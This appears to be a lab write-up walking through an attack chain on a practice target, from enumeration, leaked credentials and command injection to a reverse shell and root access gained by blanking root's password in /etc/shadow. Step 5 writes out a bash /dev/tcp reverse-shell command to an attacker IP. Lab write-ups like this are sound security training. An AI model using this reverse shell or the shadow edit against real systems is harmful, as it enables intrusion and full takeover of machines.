# Remote Code Execution (RCE) to Root Privilege Escalation

This lab demonstrates how to exploit a **Remote Code Execution (RCE)** vulnerability to obtain a **Reverse Shell**, upgrade it to a fully interactive shell, and finally escalate privileges to **root** using a misconfigured **sudo** permission.

---

## Step 1 - Network Enumeration

We began by performing an Nmap scan to identify open ports and available services on the target.

![](../Images/Pasted%20image%2020260716155816.png)

To gather more detailed information, we performed service and version detection against the discovered ports.

![](../Images/Pasted%20image%2020260716155905.png)

---

## Step 2 - Web Enumeration

We used directory fuzzing to discover hidden files and directories exposed by the web server.

![](../Images/Pasted%20image%2020260331170016.png)

Next, we repeated the fuzzing process using the **PHP** extension, which revealed a login page.

![](../Images/Pasted%20image%2020260716160428.png)

---

## Step 3 - Credential Discovery

We examined the **robots.txt** file and discovered what appeared to be a password.

![](../Images/Pasted%20image%2020260716160245.png)

Next, we viewed the source code of the application's homepage and identified a valid username.

![](../Images/Pasted%20image%2020260716160620.png)

Using the discovered credentials, we successfully authenticated to the application.

![](../Images/Pasted%20image%2020260716160739.png)

---

## Step 4 - Identifying the Vulnerability

After exploring the application, we discovered that one of the input fields was vulnerable to **Command Injection**, allowing operating system commands to be executed on the server.

![](../Images/Pasted%20image%2020260716160815.png)

---

## Step 5 - Obtaining a Reverse Shell

To gain interactive access to the target system, we generated a Bash Reverse Shell payload from **revshells.com**.

![](../Images/Pasted%20image%2020260716161118.png)

We slightly modified the payload by prepending `bash -c`, resulting in the following command:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.143.146/4444 0>&1'
```

After executing the payload through the vulnerable input, the server initiated a connection back to our listener.

![](../Images/Pasted%20image%2020260716161753.png)

We started a Netcat listener and successfully received a Reverse Shell.

![](../Images/Pasted%20image%2020260331170035.png)

---

## Step 6 - Upgrading the Shell

The initial Reverse Shell was not fully interactive.

To improve usability, we upgraded it to a proper TTY shell using the standard `stty` technique.

One of the main advantages of upgrading the shell is that keyboard shortcuts such as **Ctrl+C** no longer terminate the shell unexpectedly.

![](../Images/Pasted%20image%2020260331170204.png)

---

## Step 7 - Privilege Escalation

We checked the current user's **sudo** privileges using:

```bash
sudo -l
```

This command lists the programs or commands that the current user is allowed to execute with elevated privileges.

![](../Images/Pasted%20image%2020260716163033.png)

The output revealed that the current user had unrestricted **sudo** privileges, allowing administrative access to the system.

---

## Step 8 - Accessing the Shadow File

With elevated privileges, we opened the `/etc/shadow` file.

This file stores the password hashes for all local user accounts and is normally accessible only by the root user.

![](../Images/Pasted%20image%2020260716163428.png)

---

## Step 9 - Removing the Root Password

We edited the root user's entry in the shadow file and removed the password hash.

As a result, the root account no longer required a password for authentication.

![](../Images/Pasted%20image%2020260716163531.png)

---

## Step 10 - Logging in as Root

Finally, we switched to the root account without providing a password and obtained full administrative access to the target system.

![](../Images/Pasted%20image%2020260716163611.png)

The privilege escalation was successful, and we gained a root shell.